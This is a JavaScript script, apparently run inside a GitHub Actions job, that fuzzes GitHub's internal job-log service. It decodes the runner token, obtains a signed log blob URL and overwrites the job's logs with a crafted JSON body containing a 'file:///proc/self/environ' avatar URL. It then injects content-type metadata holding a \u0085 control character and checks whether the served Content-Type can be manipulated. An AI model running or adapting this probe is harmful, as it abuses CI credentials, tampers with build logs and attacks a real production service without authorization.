import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {BlobClient} from '@azure/storage-blob';
import {getResultsServiceUrl} from '../node_modules/@actions/artifact/lib/internal/shared/config.js';

const rt=process.env.ACTIONS_RUNTIME_TOKEN||'';
const claims=JSON.parse(Buffer.from(rt.split('.')[1],'base64url').toString());
const m=new RegExp('Actions\\.Results:([^: ]+):([^ ]+)').exec(claims.scp||'');
const runBackend=m?m[1]:null, jobBackend=m?m[2]:null;
const repo=process.env.GITHUB_REPOSITORY, runId=process.env.GITHUB_RUN_ID, token=process.env.GITHUB_TOKEN;
const odd='\u0085application/json', oddApp='application/json\u0085';
const body=Buffer.from(JSON.stringify({full_name:`x/${repo}`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'metafuzz',stargazers_count:0}));
function req(url,method='GET',body=null,headers={}){return new Promise((resolve,reject)=>{const t=new URL(url);const mod=t.protocol==='https:'?https:http;
  const r=mod.request(t,{method,headers,timeout:25000},res=>{const c=[];res.on('data',x=>c.push(x));res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(c)}));});
  r.on('error',reject);r.on('timeout',()=>r.destroy(new Error('timeout')));if(body)r.write(body);r.end();});}
async function twirp(method,payload){const url=new URL(`/twirp/results.services.receiver.Receiver/${method}`,getResultsServiceUrl()).href;
  const r=await req(url,'POST',Buffer.from(JSON.stringify(payload)),{Authorization:`Bearer ${rt}`,'Content-Type':'application/json',Accept:'application/json'});
  let j=null;try{j=JSON.parse(r.body.toString())}catch{}
  return {status:r.status,body:j,raw:r.body.toString().slice(0,200)};}
async function upload(url,bytes,ct){const b=new BlobClient(url).getBlockBlobClient();await b.uploadData(bytes,{blobHTTPHeaders:{blobContentType:ct}});}
function ctHex(h){return h?Buffer.from(h,'latin1').toString('hex'):null;}
// find job id
let jobId=null;
try{const jobs=await req(`https://api.github.com/repos/${repo}/actions/runs/${runId}/jobs?per_page=100`,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'metafuzz'});
  const j=JSON.parse(jobs.body.toString()); const job=(j.jobs||[]).find(x=>x.name===process.env.GITHUB_JOB)||(j.jobs||[])[0]; jobId=job?.id;
}catch{}
const signed=await twirp('GetJobLogsSignedBlobURL',{workflow_run_backend_id:runBackend,workflow_job_run_backend_id:jobBackend});
const logsUrl=signed.body&&signed.body.logs_url;
console.log('METAFUZZ start',JSON.stringify({runBackend,jobBackend,jobId,hasUrl:!!logsUrl}));
const variants=[
 ['baseline',{},'text/plain'],
 ['meta-content-type',{content_type:odd},'text/plain'],
 ['meta-contentType',{contentType:odd},'text/plain'],
 ['meta-mime-type',{mime_type:odd},'text/plain'],
 ['meta-mimeType',{mimeType:odd},'text/plain'],
 ['meta-type',{type:odd},'text/plain'],
 ['meta-media-type',{media_type:odd},'text/plain'],
 ['meta-format',{format:'json'},'text/plain'],
 ['meta-extension',{extension:'json'},'text/plain'],
 ['meta-filename',{filename:'job-logs.json'},'text/plain'],
 ['meta-content-type-apptrail',{content_type:oddApp},'text/plain'],
 ['blob-odd-baseline',{},odd],
 ['blob-odd-meta',{content_type:odd},odd],
];
for(const [label,extra,blobCt] of variants){
  const rec={label};
  try{
    if(logsUrl) await upload(logsUrl,body,blobCt);
    const stamp=new Date().toISOString();
    const meta=await twirp('CreateJobLogsMetadata',{workflow_run_backend_id:runBackend,workflow_job_run_backend_id:jobBackend,uploaded_at:stamp,line_count:1,...extra});
    rec.meta=meta.status; rec.metaBody=meta.body; rec.metaRaw=meta.raw;
    const r1=await req(`https://api.github.com/repos/${repo}/actions/jobs/${jobId}/logs`,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'metafuzz'});
    rec.rest=r1.status;
    if(r1.headers.location){const loc=new URL(r1.headers.location);rec.hasRsct=loc.searchParams.has('rsct');rec.rsct=loc.searchParams.get('rsct');rec.ext=loc.pathname.split('.').pop();
      const r2=await req(r1.headers.location);rec.final=r2.status;rec.finalCtHex=ctHex(r2.headers['content-type']);rec.match=r2.body.equals(body);
      rec.hdrs=r2.rawHeaders.reduce((n,v,i)=>i%2===0&&String(v).toLowerCase()==='content-type'?n+1:n,0);
    } else rec.dlBody=r1.body.toString().slice(0,120);
  }catch(e){rec.err=String(e.message).slice(0,200);}
  console.log('METAFUZZ',JSON.stringify(rec));
}
